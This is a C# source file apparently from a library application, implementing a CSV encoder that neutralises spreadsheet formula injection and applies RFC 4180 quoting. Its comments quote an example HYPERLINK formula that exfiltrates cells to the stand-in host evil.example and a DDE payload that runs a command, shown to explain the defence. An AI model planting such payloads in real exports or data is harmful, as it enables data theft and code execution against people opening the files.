namespace Library.Application.Reports.Export;

/// <summary>
/// Encodes a single value for safe inclusion in a CSV file.
/// </summary>
/// <remarks>
/// <para>
/// Two separate jobs, and conflating them is how CSV exports go wrong:
/// </para>
/// <list type="number">
///   <item><b>Quoting</b>, so a value containing a comma, quote or newline does
///     not break the file's structure. Every CSV library does this.</item>
///   <item><b>Formula-injection defence</b>, so a value does not execute when the
///     file is opened in a spreadsheet. Most CSV libraries do <i>not</i> do this,
///     because it is not a CSV concern — it is a concern about what Excel does
///     with a CSV.</item>
/// </list>
/// <para>
/// The second is the one that matters here, and it is a real vulnerability
/// rather than a theoretical one.
/// </para>
/// </remarks>
public interface ICsvFieldEncoder
{
    /// <summary>Encodes one field: neutralises formulas, then quotes if needed.</summary>
    string Encode(string? value);
}

/// <summary>
/// Default encoder: neutralises spreadsheet formulas, then applies RFC 4180 quoting.
/// </summary>
/// <remarks>
/// <para>
/// <b>The attack this prevents (CSV / formula injection, CWE-1236).</b> Excel,
/// LibreOffice Calc and Google Sheets treat a cell beginning with <c>=</c>,
/// <c>+</c>, <c>-</c> or <c>@</c> as a formula, not text. So a book title
/// catalogued as:
/// </para>
/// <code>
/// =HYPERLINK("https://evil.example/?d="&amp;A1&amp;A2&amp;A3,"Click for details")
/// </code>
/// <para>
/// becomes a working link in the librarian's spreadsheet that exfiltrates
/// neighbouring cells when clicked. Worse variants exist: <c>=cmd|'/c calc'!A0</c>
/// invokes DDE, which older Excel configurations will execute after a prompt most
/// users click through.
/// </para>
/// <para>
/// <b>Why the API being safe is not enough.</b> Nothing here is an injection
/// against <i>this</i> system — the value is stored and returned faithfully, and
/// every query is parameterised. The vulnerability is in the export: this
/// application writes a file that another application executes. A server that
/// only defends its own process hands the attack to the person who opens the
/// download.
/// </para>
/// <para>
/// <b>The fix and its cost.</b> A leading <c>'</c> forces the spreadsheet to
/// treat the cell as text. The cost is visible: a legitimate title that genuinely
/// starts with <c>-</c> or <c>+</c> shows a stray apostrophe in Excel. That is
/// the accepted trade — a cosmetic blemish on rare rows against arbitrary formula
/// execution on the rest.
/// </para>
/// </remarks>
public sealed class CsvFieldEncoder : ICsvFieldEncoder
{
    /// <summary>
    /// Characters that begin a formula in every major spreadsheet.
    /// </summary>
    /// <remarks>
    /// <c>=</c> and <c>+</c> start a formula outright. <c>-</c> does too, because
    /// <c>-1+1</c> is arithmetic. <c>@</c> is Lotus-era syntax that Excel still
    /// honours, and it is the one most commonly missed.
    /// </remarks>
    private static readonly char[] FormulaTriggers = ['=', '+', '-', '@'];

    /// <summary>
    /// Control characters that also trigger formula interpretation.
    /// </summary>
    /// <remarks>
    /// Tab and carriage return at the start of a cell are stripped by some
    /// spreadsheet parsers <i>before</i> the formula check, so <c>"\t=1+1"</c>
    /// evaluates. Prefixing on these too closes that bypass.
    /// </remarks>
    private static readonly char[] LeadingControlTriggers = ['\t', '\r'];

    public string Encode(string? value)
    {
        if (string.IsNullOrEmpty(value))
        {
            return string.Empty;
        }

        string safe = NeutraliseFormula(value);

        return NeedsQuoting(safe) ? Quote(safe) : safe;
    }

    /// <summary>
    /// Prefixes a leading formula trigger with an apostrophe.
    /// </summary>
    /// <remarks>
    /// Checked on the raw value before quoting, because quoting does not help:
    /// Excel strips the surrounding quotes and then evaluates what is inside.
    /// <c>"=1+1"</c> is still a formula.
    /// </remarks>
    private static string NeutraliseFormula(string value)
    {
        char first = value[0];

        bool isTrigger =
            Array.IndexOf(FormulaTriggers, first) >= 0 ||
            Array.IndexOf(LeadingControlTriggers, first) >= 0;

        return isTrigger ? "'" + value : value;
    }

    /// <summary>RFC 4180: quote when the field contains a delimiter, quote or newline.</summary>
    private static bool NeedsQuoting(string value) =>
        value.Contains(',', StringComparison.Ordinal) ||
        value.Contains('"', StringComparison.Ordinal) ||
        value.Contains('\n', StringComparison.Ordinal) ||
        value.Contains('\r', StringComparison.Ordinal);

    /// <summary>Wraps in quotes, doubling any quote inside — RFC 4180's escape.</summary>
    private static string Quote(string value) =>
        $"\"{value.Replace("\"", "\"\"", StringComparison.Ordinal)}\"";
}
